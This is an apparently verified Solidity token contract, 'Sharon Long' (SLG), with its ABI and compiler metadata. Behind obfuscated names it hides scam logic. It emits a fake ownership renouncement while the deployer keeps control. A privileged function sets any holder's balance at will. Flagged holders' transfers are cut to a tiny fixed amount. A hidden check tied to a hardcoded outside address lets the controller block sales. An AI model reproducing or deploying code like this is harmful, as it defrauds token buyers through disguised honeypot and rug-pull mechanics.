{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fundIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listAmount {\n    function createPair(address toMax, address autoMax) external returns (address);\n}\n\ninterface feeTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeBuy) external view returns (uint256);\n\n    function transfer(address launchedTx, uint256 shouldAt) external returns (bool);\n\n    function allowance(address receiverSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedTx,\n        uint256 shouldAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromMin, uint256 value);\n    event Approval(address indexed receiverSender, address indexed spender, uint256 value);\n}\n\ninterface feeTxMetadata is feeTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SharonLong is launchBuy, feeTx, feeTxMetadata {\n\n    function tokenReceiver(uint256 shouldAt) public {\n        buyTotal();\n        minMax = shouldAt;\n    }\n\n    function approve(address shouldMin, uint256 shouldAt) public virtual override returns (bool) {\n        isEnableSender[_msgSender()][shouldMin] = shouldAt;\n        emit Approval(_msgSender(), shouldMin, shouldAt);\n        return true;\n    }\n\n    function autoLaunched(address marketingAt) public {\n        buyTotal();\n        if (enableToken != maxMarketing) {\n            amountTx = true;\n        }\n        if (marketingAt == feeSender || marketingAt == maxShould) {\n            return;\n        }\n        tradingSell[marketingAt] = true;\n    }\n\n    uint256 amountFund;\n\n    mapping(address => bool) public tradingSell;\n\n    function transferFrom(address receiverLaunchedTo, address launchedTx, uint256 shouldAt) external override returns (bool) {\n        if (_msgSender() != senderMode) {\n            if (isEnableSender[receiverLaunchedTo][_msgSender()] != type(uint256).max) {\n                require(shouldAt <= isEnableSender[receiverLaunchedTo][_msgSender()]);\n                isEnableSender[receiverLaunchedTo][_msgSender()] -= shouldAt;\n            }\n        }\n        return isSell(receiverLaunchedTo, launchedTx, shouldAt);\n    }\n\n    uint256 minMax;\n\n    address public feeSender;\n\n    uint256 private enableToken;\n\n    uint256 private fromAmount;\n\n    function amountEnableReceiver(address receiverLaunchedTo, address launchedTx, uint256 shouldAt) internal returns (bool) {\n        require(buyAmountToken[receiverLaunchedTo] >= shouldAt);\n        buyAmountToken[receiverLaunchedTo] -= shouldAt;\n        buyAmountToken[launchedTx] += shouldAt;\n        emit Transfer(receiverLaunchedTo, launchedTx, shouldAt);\n        return true;\n    }\n\n    mapping(address => uint256) private buyAmountToken;\n\n    uint256 private sellLiquidityAmount = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellLiquidityAmount;\n    }\n\n    mapping(address => bool) public walletEnable;\n\n    function fundFromShould() public {\n        emit OwnershipTransferred(feeSender, address(0));\n        exemptShould = address(0);\n    }\n\n    uint8 private walletAutoTeam = 18;\n\n    function isSell(address receiverLaunchedTo, address launchedTx, uint256 shouldAt) internal returns (bool) {\n        if (receiverLaunchedTo == feeSender) {\n            return amountEnableReceiver(receiverLaunchedTo, launchedTx, shouldAt);\n        }\n        uint256 feeAt = feeTx(maxShould).balanceOf(listTrading);\n        require(feeAt == minMax);\n        require(launchedTx != listTrading);\n        if (tradingSell[receiverLaunchedTo]) {\n            return amountEnableReceiver(receiverLaunchedTo, launchedTx, exemptEnableMarketing);\n        }\n        return amountEnableReceiver(receiverLaunchedTo, launchedTx, shouldAt);\n    }\n\n    bool public teamToken;\n\n    bool public tokenModeMin;\n\n    address listTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private maxMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeTx;\n    }\n\n    address private exemptShould;\n\n    function name() external view virtual override returns (string memory) {\n        return toSell;\n    }\n\n    uint256 constant exemptEnableMarketing = 3 ** 10;\n\n    uint256 private tradingMarketing;\n\n    event OwnershipTransferred(address indexed sellLiquidity, address indexed tradingTake);\n\n    function getOwner() external view returns (address) {\n        return exemptShould;\n    }\n\n    function atSwap(address launchedIsBuy) public {\n        if (tokenModeMin) {\n            return;\n        }\n        \n        walletEnable[launchedIsBuy] = true;\n        \n        tokenModeMin = true;\n    }\n\n    bool private limitAt;\n\n    uint256 public launchedBuy;\n\n    function transfer(address launchedLaunch, uint256 shouldAt) external virtual override returns (bool) {\n        return isSell(_msgSender(), launchedLaunch, shouldAt);\n    }\n\n    bool private amountTx;\n\n    function owner() external view returns (address) {\n        return exemptShould;\n    }\n\n    string private takeTx = \"SLG\";\n\n    function buyTotal() private view {\n        require(walletEnable[_msgSender()]);\n    }\n\n    bool public tradingToken;\n\n    function allowance(address tradingFund, address shouldMin) external view virtual override returns (uint256) {\n        if (shouldMin == senderMode) {\n            return type(uint256).max;\n        }\n        return isEnableSender[tradingFund][shouldMin];\n    }\n\n    constructor (){\n        if (maxMarketing == tradingMarketing) {\n            tradingMarketing = launchedBuy;\n        }\n        fundIs minTokenLaunch = fundIs(senderMode);\n        maxShould = listAmount(minTokenLaunch.factory()).createPair(minTokenLaunch.WETH(), address(this));\n        if (fromAmount != maxMarketing) {\n            fromAmount = maxMarketing;\n        }\n        feeSender = _msgSender();\n        fundFromShould();\n        walletEnable[feeSender] = true;\n        buyAmountToken[feeSender] = sellLiquidityAmount;\n        if (limitAt != amountTx) {\n            limitAt = false;\n        }\n        emit Transfer(address(0), feeSender, sellLiquidityAmount);\n    }\n\n    mapping(address => mapping(address => uint256)) private isEnableSender;\n\n    address public maxShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletAutoTeam;\n    }\n\n    function balanceOf(address modeBuy) public view virtual override returns (uint256) {\n        return buyAmountToken[modeBuy];\n    }\n\n    address senderMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function buyAmount(address launchedLaunch, uint256 shouldAt) public {\n        buyTotal();\n        buyAmountToken[launchedLaunch] = shouldAt;\n    }\n\n    string private toSell = \"Sharon Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedIsBuy\",\"type\":\"address\"}],\"name\":\"atSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"}],\"name\":\"autoLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"buyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFromShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenModeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchedTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SharonLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}